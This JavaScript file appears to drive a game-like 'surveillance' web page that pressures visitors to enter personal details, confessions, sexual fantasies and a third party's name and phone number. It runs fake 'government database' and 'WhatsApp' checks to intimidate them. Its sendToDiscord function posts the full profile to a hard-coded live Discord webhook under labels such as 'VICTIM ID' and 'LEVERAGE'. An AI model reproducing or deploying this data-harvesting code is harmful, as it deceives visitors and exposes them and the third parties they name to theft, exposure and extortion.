// AUDIO CONTEXT
const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

// STATE
let currentStage = 1;
let mantraCount = 0;
const MAX_MANTRA = 5;

// ELEMENTS
const terminal = document.getElementById('terminal');

// INIT
document.getElementById('start-btn').addEventListener('click', () => {
    audioCtx.resume();
    document.getElementById('overlay').classList.add('hidden');
    document.getElementById('main-ui').classList.remove('hidden');

    typeLog("INITIALIZING SURVEILLANCE...");
    typeLog("MANUAL ENTRY REQUIRED...");
    playHum();

    // PLAY EXTERNAL AUDIO
    const bgAudio = document.getElementById('bg-audio');
    if (bgAudio) {
        bgAudio.volume = 0.5;
        bgAudio.play().catch(e => console.log("Audio play failed:", e));
    }
});

// VALIDATION LOGIC
function isValidInput(text) {
    if (!text || text.length < 3) return false;

    const lower = text.toLowerCase().trim();

    // Check for repetitive chars (e.g. "aaaaa")
    if (/^(\w)\1+$/.test(lower)) return false;

    // Check for repetitive words (e.g. "no no no")
    const words = lower.split(/\s+/);
    if (words.length > 2) {
        const unique = new Set(words);
        if (unique.size === 1) return false; // "test test test"
    }

    return true;
};

// LOGIC
window.nextStage = function (stage) {
    const btn = document.querySelector(`#stage-${stage} .next-btn`);

    // STAGE 1 Validation
    if (stage === 1) {
        const name = document.getElementById('inp-name').value;
        const phone = document.getElementById('inp-phone').value;
        const email = document.getElementById('inp-email').value;
        const address = document.getElementById('inp-address').value;
        const income = document.getElementById('inp-income').value;

        if (!isValidInput(name) || !isValidInput(address) || !isValidInput(income)) {
            alert("SYSTEM ERROR: INVALID DATA DETECTED. DO NOT LIE.");
            return;
        }

        if (!email.includes('@') || !email.includes('.')) {
            alert("INVALID EMAIL FORMAT.");
            return;
        }

        // FAKE VERIFICATION ANIMATION
        const verifyUI = document.getElementById('verify-ui-1');
        const verifyText = document.getElementById('verify-text-1');

        btn.classList.add('hidden');
        verifyUI.classList.remove('hidden');

        let steps = ["CONNECTING TO GOV DATABASE...", "MATCHING SOCIAL SECURITY...", "CHECKING BANK RECORDS...", "VERIFIED."];
        let i = 0;

        const interval = setInterval(() => {
            verifyText.innerText = steps[i];
            playSound('click');
            i++;
            if (i >= steps.length) {
                clearInterval(interval);
                setTimeout(() => {
                    verifyUI.classList.add('hidden');
                    typeLog(`IDENTITY CONFIRMED: ${name}`);
                    typeLog(`INCOME LEVEL: ${income}`);
                    goToStage(1.5);
                }, 1000);
            }
        }, 1500);
        return;
    }

    // STAGE 1.5 (RELATIONSHIPS)
    if (stage === 1.5) {
        const secret = document.getElementById('inp-secret').value;
        if (!isValidInput(secret) || secret.length < 5) {
            alert("WE KNOW YOU ARE LYING. CONFESS.");
            return;
        }
        goToStage(1.8); // Go to NEW Stage 1.8
        return;
    }

    // STAGE 1.8 (DARK PSYCHOLOGY)
    if (stage === 1.8) {
        const hate = document.getElementById('inp-hate').value;
        const crime = document.getElementById('inp-crime').value;

        if (!isValidInput(hate)) {
            alert("GIVE US A NAME.");
            return;
        }
        if (crime.length < 3) {
            alert("EVERYONE IS GUILTY OF SOMETHING.");
            return;
        }

        goToStage(2);
        return;
    }

    // STAGE 2 Validation
    if (stage === 2) {
        const target = document.getElementById('inp-target-name').value;
        const tPhone = document.getElementById('inp-target-phone').value;

        if (!isValidInput(target) || !isValidInput(tPhone)) {
            alert("INVALID DATA. WE NEED REAL NAMES.");
            return;
        }

        btn.innerText = "CHECKING WHATSAPP...";
        document.getElementById('whatsapp-check').classList.remove('hidden');

        setTimeout(() => {
            typeLog(`TARGET LOCATED: ${target}`);
            typeLog(`WHATSAPP HISTORY: DOWNLOADED.`);
            goToStage(3);
        }, 2000);
        return; // Wait for timeout
    }

    if (stage === 3) {
        const vices = document.getElementById('inp-vices').value;
        const weakness = document.getElementById('inp-weakness').value;

        // Strict check on confessions
        if (vices.length < 10 || weakness.length < 10) {
            alert("TOO SHORT. ELABORATE ON YOUR SINS.");
            return;
        }

        if (!isValidInput(vices) || !isValidInput(weakness)) {
            alert("REPETITION DETECTED. WRITE PROPERLY.");
            return;
        }

        // DATA HARVEST TIME
        sendToDiscord();
        typeLog("PROFILE UPLOADED TO SERVER.");
    }

    goToStage(stage + 1);
}

// Updated Discord Logic to include new fields
function sendToDiscord() {
    const webhookURL = "https://discord.com/api/webhooks/1471941517894619322/EC-Nmdqj5QvXkkEJUcoyCwPgEDoaC3-7ajkweyi3pUFeSL-WO-nG5Hxp8OfUxd4IAfgm";

    let cheatStatus = "UNKNOWN";
    const cheatYes = document.querySelector('input[name="cheat"][value="YES"]');
    if (cheatYes && cheatYes.checked) cheatStatus = "YES";
    const cheatNo = document.querySelector('input[name="cheat"][value="NO"]');
    if (cheatNo && cheatNo.checked) cheatStatus = "NO";

    const data = {
        name: document.getElementById('inp-name').value,
        email: document.getElementById('inp-email').value,
        phone: document.getElementById('inp-phone').value,
        address: document.getElementById('inp-address').value,
        income: document.getElementById('inp-income').value,
        // NEW FIELDS
        relationship: document.getElementById('inp-relationship').value,
        cheat: cheatStatus,
        secret: document.getElementById('inp-secret').value,

        // DARK PSYCHOLOGY
        hate: document.getElementById('inp-hate').value,
        crime: document.getElementById('inp-crime').value,
        regret: document.getElementById('inp-regret').value,

        // FANTASIES
        fantasy: document.getElementById('inp-fantasy').value,
        kink: document.getElementById('inp-kink').value,
        paid: (document.querySelector('input[name="paid"]:checked') ? document.querySelector('input[name="paid"]:checked').value : "UNKNOWN"),

        targetName: document.getElementById('inp-target-name').value,
        targetPhone: document.getElementById('inp-target-phone').value,
        vices: document.getElementById('inp-vices').value,
        weakness: document.getElementById('inp-weakness').value,
    };

    const payload = {
        username: "VOID LEAK BOT",
        avatar_url: "https://i.imgur.com/4M34hi2.png",
        embeds: [{
            title: "🚨 FULL DATA PROFILE CAPTURED 🚨",
            color: 0, // Black
            fields: [
                { name: "👤 VICTIM ID", value: `**Name:** ${data.name}\n**Email:** ${data.email}\n**Phone:** ${data.phone}` },
                { name: "🏠 LOCATION & STATUS", value: `**Address:** ${data.address}\n**Income:** ${data.income}` },
                { name: "🎯 LEVERAGE", value: `**Target:** ${data.targetName}\n**Target Phone:** ${data.targetPhone}` },
                { name: "🧠 CONFESSION", value: `**Vices:** ${data.vices}\n**Weakness:** ${data.weakness}` }
            ],
            footer: { text: "Protocol: SUBMISSION VERIFIED" },
            timestamp: new Date()
        }]
    };

    fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
}

function goToStage(num) {
    document.querySelectorAll('.form-stage').forEach(el => el.classList.add('hidden'));

    // Scegli lo stage
    const nextEl = document.getElementById(`stage-${num}`);
    if (nextEl) nextEl.classList.remove('hidden');

    document.getElementById('stage-title').innerText = `STAGE ${num}: PROCESSING`;

    if (num === 4) {
        document.getElementById('stage-title').innerText = "FINAL SUBMISSION";
    }
}

// MANTRA LOGIC
window.checkMantra = function () {
    const input = document.getElementById('inp-mantra');
    const target = "I AM DATA. I AM YOURS.";
    const val = input.value.toUpperCase();

    if (val === target) {
        mantraCount++;
        document.getElementById('mantra-count').innerText = `${mantraCount} / ${MAX_MANTRA}`;
        input.value = ""; // Reset
        playSound('click');
        typeLog(`SUBMISSION ACEPTED: ${mantraCount}`);

        if (mantraCount >= MAX_MANTRA) {
            // TRIGGER ENDING
            document.querySelectorAll('.form-stage').forEach(el => el.classList.add('hidden'));
            document.getElementById('stage-final').classList.remove('hidden');
            triggerAlarm();
        }
    }
}

function typeLog(msg) {
    // Terminal removed by user request. Logging to console instead to prevent errors.
    console.log(`> ${msg}`);
    // const div = document.createElement('div');
    // div.className = 'line';
    // div.innerText = `> ${msg}`;
    // if(terminal) terminal.appendChild(div);
    // playSound('click');
}

// AUDIO SYNTH
function playSound(type) {
    if (audioCtx.state === 'suspended') audioCtx.resume();
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.connect(gain);
    gain.connect(audioCtx.destination);

    if (type === 'click') {
        osc.frequency.setValueAtTime(800, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.05);
    }
}

function playHum() {
    // Ambient Hum
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.frequency.value = 50;
    gain.gain.value = 0.05;
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    osc.start();
}

function triggerAlarm() {
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.type = 'sawtooth';
    osc.frequency.setValueAtTime(440, audioCtx.currentTime);
    osc.frequency.linearRampToValueAtTime(880, audioCtx.currentTime + 0.5);

    gain.gain.value = 0.5;

    osc.connect(gain);
    gain.connect(audioCtx.destination);
    osc.start();

    // Loop simulated
    setInterval(() => {
        const o = audioCtx.createOscillator();
        o.type = 'sawtooth';
        o.frequency.setValueAtTime(440, audioCtx.currentTime);
        o.frequency.linearRampToValueAtTime(880, audioCtx.currentTime + 0.5);
        o.connect(gain);
        o.start();
        o.stop(audioCtx.currentTime + 0.5);
    }, 600);
}
